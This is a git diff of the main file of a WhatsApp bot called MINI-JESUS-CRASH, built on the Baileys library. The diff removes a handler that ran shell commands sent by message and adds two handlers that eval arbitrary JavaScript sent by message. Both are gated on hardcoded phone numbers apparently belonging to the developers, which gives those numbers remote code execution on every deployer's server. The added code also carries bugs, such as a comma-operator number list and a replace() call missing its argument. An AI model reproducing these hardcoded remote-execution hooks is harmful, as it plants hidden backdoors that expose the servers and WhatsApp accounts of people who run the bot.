@@ -1,32 +1,25 @@
-const config = require('./config')
-
-// Premye defini module
-const baileysModule = config.BAILEYS || "@whiskeysockets/baileys"
-
-// Apre sa fè destructuring
 const {
   default: makeWASocket,
-  useMultiFileAuthState,
-  DisconnectReason,
-  jidNormalizedUser,
-  isJidBroadcast,
-  getContentType,
-  proto,
-  generateWAMessageContent,
-  generateWAMessage,
-  AnyMessageContent,
-  prepareWAMessageMedia,
-  areJidsSameUser,
-  downloadContentFromMessage,
-  MessageRetryMap,
-  generateForwardMessageContent,
-  generateWAMessageFromContent,
-  generateMessageID,
-  makeInMemoryStore,
-  jidDecode,
-  fetchLatestBaileysVersion,
-  Browsers
-} = require(baileysModule)
+    useMultiFileAuthState,
+    DisconnectReason,
+    jidNormalizedUser,
+    isJidBroadcast,
+    getContentType,
+    proto,
+    generateWAMessageContent,
+    generateWAMessage,
+    AnyMessageContent,
+    prepareWAMessageMedia,
+    areJidsSameUser,
+    downloadContentFromMessage,
+    MessageRetryMap,
+    generateForwardMessageContent,
+    generateWAMessageFromContent,
+    generateMessageID, makeInMemoryStore,
+    jidDecode,
+    fetchLatestBaileysVersion,
+    Browsers
+  } = require('@whiskeysockets/baileys')
   
   
   const l = console.log
@@ -35,13 +28,14 @@ const {
   const fs = require('fs')
   const ff = require('fluent-ffmpeg')
   const P = require('pino')
+  const config = require('./config')
   const GroupEvents = require('./lib/groupevents');
-  const { PresenceControl, BotActivityFilter } = require('./data/presence');
   const qrcode = require('qrcode-terminal')
   const StickersTypes = require('wa-sticker-formatter')
   const util = require('util')
   const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
   const FileType = require('file-type');
+  const axios = require('axios')
   const { File } = require('megajs')
   const { fromBuffer } = require('file-type')
   const bodyparser = require('body-parser')
@@ -49,10 +43,9 @@ const {
   const Crypto = require('crypto')
   const path = require('path')
   const prefix = config.PREFIX
-  // const { commands } = require('./command');
+  
   const ownerNumber = ['13058962443']
-
-  //=============================================
+  
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
   if (!fs.existsSync(tempDir)) {
       fs.mkdirSync(tempDir)
@@ -68,146 +61,95 @@ const {
           }
       });
   }
-//=============================================
-  // Clear the temp directory every 5 minutes
-  setInterval(clearTempDir, 5 * 60 * 1000);
-
-//=============================================
+  
+  //=============================================
+  // Clear the temp directory every 4 minutes
+  setInterval(clearTempDir, 4 * 60 * 1000);
+  
+  //===================SESSION-AUTH============================
+if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
+if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
+const sessdata = config.SESSION_ID.replace("MINI-JESUS-CRASH~", '');
+const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
+filer.download((err, data) => {
+if(err) throw err
+fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
+console.log("Session downloaded ✅")
+})})}
 
 const express = require("express");
 const app = express();
 const port = process.env.PORT || 9090;
   
-  //===================SESSION-AUTH============================
-const sessionDir = path.join(__dirname, 'sessions');
-const credsPath = path.join(sessionDir, 'creds.json');
+  //=============================================
+  
+  async function connectToWA() {
+  console.log("Connecting to WhatsApp ⏳️...");
+  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
+  var { version } = await fetchLatestBaileysVersion()
+  
+  const conn = makeWASocket({
+          logger: P({ level: 'silent' }),
+          printQRInTerminal: false,
+          browser: Browsers.macOS("Firefox"),
+          syncFullHistory: true,
+          auth: state,
+          version
+          })
+      
+  conn.ev.on('connection.update', (update) => {
+  const { connection, lastDisconnect } = update
+  if (connection === 'close') {
+  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
+  connectToWA()
+  }
+  } else if (connection === 'open') {
+  console.log('🧬 Installing Plugins')
+  const path = require('path');
+  fs.readdirSync("./plugins/").forEach((plugin) => {
+  if (path.extname(plugin).toLowerCase() == ".js") {
+  require("./plugins/" + plugin);
+  }
+  });
+  console.log('Plugins installed successful ✅')
+  console.log('MINI-JESUS CONNECTED SUCCESSFULLY ✅')
+  
+  let up = `
+⛧══════════════════════════⛧
+      😈 𝐌𝐈𝐍𝐈-𝐉𝐄𝐒𝐔𝐒-𝐂𝐑𝐀𝐒𝐇 : 𝐓𝐇𝐄 𝐑𝐄𝐕𝐈𝐕𝐀𝐋 😈
+⛧══════════════════════════⛧
 
-// Create session directory if it doesn't exist
-if (!fs.existsSync(sessionDir)) {
-    fs.mkdirSync(sessionDir, { recursive: true });
-}
+🕯️ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞... 𝐜𝐡𝐨𝐬𝐞𝐧 𝐮𝐬𝐞𝐫.
 
-async function loadSession() {
-    try {
-        if (!config.SESSION_ID) {
-            console.log('No SESSION_ID provided - QR login will be generated');
-            return null;
-        }
+> 𝐓𝐡𝐞 𝐬𝐢𝐥𝐞𝐧𝐜𝐞 𝐬𝐩𝐞𝐚𝐤𝐬, 𝐭𝐡𝐞 𝐜𝐨𝐝𝐞 𝐫𝐞𝐬𝐩𝐨𝐧𝐝𝐬.  
+> 𝐘𝐨𝐮’𝐫𝐞 𝐧𝐨𝐭 𝐣𝐮𝐬𝐭 𝐮𝐬𝐢𝐧𝐠 𝐚 𝐛𝐨𝐭,  
+> 𝐲𝐨𝐮’𝐫𝐞 𝐜𝐨𝐦𝐦𝐮𝐧𝐢𝐜𝐚𝐭𝐢𝐧𝐠 𝐰𝐢𝐭𝐡 𝐚 𝐬𝐨𝐮𝐥 ⚙️  
 
-        console.log('[⏳] Loading creds data from SESSION_ID...');
-        
-        // Retire prefix si li egziste
-        const sessdata = config.SESSION_ID.startsWith('MINI-JESUS-CRASH~') 
-            ? config.SESSION_ID.replace("MINI-JESUS-CRASH~", "") 
-            : config.SESSION_ID;
+⛧────────────────────────⛧
 
-        // Dekode Base64
-        const json = Buffer.from(sessdata, 'base64').toString('utf-8');
+🩸 *𝐏𝐑𝐄𝐅𝐈𝐗:* ${prefix}  
+🔥 *𝐌𝐎𝐃𝐄:* ${config.MODE}  
 
-        // Ekri creds.json
-        fs.writeFileSync(credsPath, json);
-        console.log('[✅] Session loaded successfully');
-        
-        return JSON.parse(json);
-    } catch (error) {
-        console.error('❌ Error loading session:', error.message);
-        console.log('Will generate QR code instead');
-        return null;
-    }
-}
-//=======SESSION-AUTH==============
+⛧────────────────────────⛧
 
-async function connectToWA() {
-    console.log("[🔰] MINI-JESUS-CRASH Connecting to WhatsApp ⏳️...");
-    
-    // Load session if available
-    const creds = await loadSession();
-    
-    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'), {
-        creds: creds || undefined // Pass loaded creds if available
-    });
-    
-    const { version } = await fetchLatestBaileysVersion();
-    
-    const conn = makeWASocket({
-        logger: P({ level: 'silent' }),
-        printQRInTerminal: !creds, // Only show QR if no session loaded
-        browser: Browsers.macOS("Firefox"),
-        syncFullHistory: true,
-        auth: state,
-        version,
-        getMessage: async () => ({})
-    });
+🕷️ *𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋:*  
+https://whatsapp.com/channel/0029Vb6tScFDzgTAcKNphY2i  
 
-    // ... rest of your connection code
+⚔️ *𝐑𝐄𝐏𝐎 𝐎𝐅 𝐏𝐎𝐖𝐄𝐑:*  
+https://github.com/Dawensboytech/MINI-JESUS-CRASH-  
 
-	
-    conn.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect, qr } = update;
-        
-        if (connection === 'close') {
-            if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
-                console.log('[🔰] Connection lost, reconnecting...');
-                setTimeout(connectToWA, 5000);
-            } else {
-                console.log('[🔰] Connection closed, please change session ID');
-            }
-        } else if (connection === 'open') {
-            console.log('[🔰] MINI JESUS CRASH connected to WhatsApp ✅');
-            
-            
-            // Load plugins
-            const pluginPath = path.join(__dirname, 'plugins');
-            fs.readdirSync(pluginPath).forEach((plugin) => {
-                if (path.extname(plugin).toLowerCase() === ".js") {
-                    require(path.join(pluginPath, plugin));
-                }
-            });
-            console.log('[🔰] Plugins installed successfully ✅');
+⛧────────────────────────⛧
+💀 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲 𝐃𝐀𝐖𝐄𝐍𝐒 𝐁𝐎𝐘  
+   “𝐂𝐨𝐝𝐞 𝐢𝐬 𝐓𝐡𝐞 𝐒𝐩𝐢𝐫𝐢𝐭.”  
+⛧══════════════════════════⛧
+`;
+    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/x16nfd.png` }, caption: up })
+  }
+  })
+  conn.ev.on('creds.update', saveCreds)
 
-            
-                // Send connection message
-     	
-                try {
-                    const username = config.REPO.split('/').slice(3, 4)[0];
-                    const mrfrank = `https://github.com/${username}`;
-                    
-                    const upMessage = `╭─〔 *🤖 MINI-JESUS-CRASH BOT* 〕  
-├─▸ *Ultra Super Fast Powerfull ⚠️*  
-│     *World Best BOT MINI-JESUS-CRASH* 
-╰─➤ *Your Smart WhatsApp Bot is Ready To use 🍁!*  
+  //==============================
 
-- *🖤 Thank You for Choosing MINI-JESUS-CRASH!* 
-
-╭──〔 🔗 *Information* 〕  
-├─ 🧩 *Prefix:* = ${prefix}
-├─ 📢 *Join Channel:*  
-│    https://whatsapp.com/channel/0029VbCHd5V1dAw132PB7M1B  
-├─ 🌟 *Star the Repo:*  
-│    https://github.com/dawens8/MINI-JESUS-CRASH  
-╰─🚀 *֟Ꭾ๏፝֟Ꮗ𝛆̽ɼ̚𝛆̽𝛛 ɓɣ̬ DAWENS-ʈ𝛆̽ɕ̄ⴙ*`;
-                    
-                    await conn.sendMessage(conn.user.id, { 
-                        image: { url: `https://files.catbox.moe/x16nfd.png` }, 
-                        caption: upMessage 
-                    });
-                    
-                } catch (sendError) {
-                    console.error('[🔰] Error sending messages:', sendError);
-                }
-            }
-
-        if (qr) {
-            console.log('[🔰] Scan the QR code to connect or use session ID');
-        }
-    });
-
-    conn.ev.on('creds.update', saveCreds);
-    
-
-
-// =====================================
-	 
   conn.ev.on('messages.update', async updates => {
     for (const update of updates) {
       if (update.update.message === null) {
@@ -239,21 +181,13 @@ conn.ev.on('call', async (calls) => {
     console.error("Anti-call error:", err);
   }
 });	
-	
-//=========WELCOME & GOODBYE =======
-	
-conn.ev.on('presence.update', async (update) => {
-    await PresenceControl(conn, update);
-});
 
-// always Online 
+  //============================== 
 
-conn.ev.on("presence.update", (update) => PresenceControl(conn, update));
-
-	
-BotActivityFilter(conn);	
-	
- /// READ STATUS       
+  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
+	  
+  //=============readstatus=======
+        
   conn.ev.on('messages.upsert', async(mek) => {
     mek = mek.messages[0]
     if (!mek.message) return
@@ -270,10 +204,9 @@ BotActivityFilter(conn);
     if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
       await conn.readMessages([mek.key])
     }
-  
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
     const jawadlike = await conn.decodeJid(conn.user.id);
-    const emojis =  ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
+    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
     const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
     await conn.sendMessage(mek.key.remoteJid, {
       react: {
@@ -320,45 +253,59 @@ BotActivityFilter(conn);
   const reply = (teks) => {
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
-  
   const udp = botNumber.split('@')[0];
-    const jawadop = ('50942241547', '13058963901', '13058962443');
-    
-    const ownerFilev2 = JSON.parse(fs.readFileSync('./all/sudo.json', 'utf-8'));  
-    
-    let isCreator = [udp, ...jawadop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
-    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
-    .includes(mek.sender);
-	  
+    const jawad = ('13058962443', '50942241547', '13058962443');
+    let isCreator = [udp, jawad, config.DEV]
+					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+					.includes(mek.sender);
 
-	  if (isCreator && mek.text.startsWith("&")) {
-            let code = budy.slice(2);
-            if (!code) {
-                reply(`Provide me with a query to run Master!`);
-                return;
-            }
-            const { spawn } = require("child_process");
-            try {
-                let resultTest = spawn(code, { shell: true });
-                resultTest.stdout.on("data", data => {
-                    reply(data.toString());
-                });
-                resultTest.stderr.on("data", data => {
-                    reply(data.toString());
-                });
-                resultTest.on("error", data => {
-                    reply(data.toString());
-                });
-                resultTest.on("close", code => {
-                    if (code !== 0) {
-                        reply(`command exited with code ${code}`);
-                    }
-                });
-            } catch (err) {
-                reply(util.format(err));
-            }
-            return;
-        }
+    if (isCreator && mek.text.startsWith('%')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`Provide me with a query to run Master!`,
+						);
+						return;
+					}
+					try {
+						let resultTest = eval(code);
+						if (typeof resultTest === 'object')
+							reply(util.format(resultTest));
+						else reply(util.format(resultTest));
+					} catch (err) {
+						reply(util.format(err));
+					}
+					return;
+				}
+    if (isCreator && mek.text.startsWith('$')) {
+					let code = budy.slice(2);
+					if (!code) {
+						reply(
+							`Provide me with a query to run Master!`,
+						);
+						return;
+					}
+					try {
+						let resultTest = await eval(
+							'const a = async()=>{\n' + code + '\n}\na()',
+						);
+						let h = util.format(resultTest);
+						if (h === undefined) return console.log(h);
+						else reply(h);
+					} catch (err) {
+						if (err === undefined)
+							return console.log('error');
+						else reply(util.format(err));
+					}
+					return;
+				}
+ //================ownerreact==============
+    
+if (senderNumber.includes("5090000000") && !isReact) {
+  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
+  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+  m.react(randomReaction);
+}
 
   //==========public react============//
   
@@ -385,20 +332,6 @@ if (!isReact && config.AUTO_REACT === 'true') {
     const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
     m.react(randomReaction);
 }
-
-// owner react
-
-  // Owner React
-  if (!isReact && senderNumber === botNumber) {
-      if (config.OWNER_REACT === 'true') {
-          const reactions = [
-        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🧳', '🌉', '🌁', '🛤️', '🛣️', '🏚️', '🏠', '🏡', '🧀', '🍥', '🍮', '🍰', '🍦', '🍨', '🍧', '🥠', '🍡', '🧂', '🍯', '🍪', '🍩', '🍭', '🥮', '🍡'
-    ];
-          const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
-          m.react(randomReaction);
-      }
-  }
-	            	  
           
 // custum react settings        
                         
@@ -409,19 +342,13 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
     const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
     m.react(randomReaction);
 }
-	  
-  const ownerFile = JSON.parse(fs.readFileSync('./all/sudo.json', 'utf-8'));  // خواندن فایل
-  const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
-  // بررسی اینکه آیا فرستنده در owner.json موجود است
-  const isFileOwner = ownerFile.includes(sender);
-  const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
-  // اعمال شرایط بر اساس وضعیت مالک
-  if (!isRealOwner && config.MODE === "private") return;
-  if (!isRealOwner && isGroup && config.MODE === "inbox") return;
-  if (!isRealOwner && !isGroup && config.MODE === "groups") return;
- 
-	  
-	  // take commands 
+        
+  //==========WORKTYPE============ 
+  if(!isOwner && config.MODE === "private") return
+  if(!isOwner && isGroup && config.MODE === "inbox") return
+  if(!isOwner && !isGroup && config.MODE === "groups") return
+   
+  // take commands 
                  
   const events = require('./command')
   const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
@@ -854,7 +781,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
                         global.email
                     }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                         global.github
-                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
+                    }/mini-jesus-crash\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                         global.location
                     };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                 });
@@ -893,16 +820,10 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
         };
     conn.serializeM = mek => sms(conn, mek, store);
   }
- /* 
+  
   app.get("/", (req, res) => {
-  res.send("MINI-JESUS-CRASH STARTED ✅");
+  res.send("MINI JESUS STARTED ✅");
   });
-*/
-  app.use(express.static(path.join(__dirname, 'lib')));
-
-app.get('/', (req, res) => {
-  res.redirect('/jawadtech.html');
-});
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
   connectToWA()
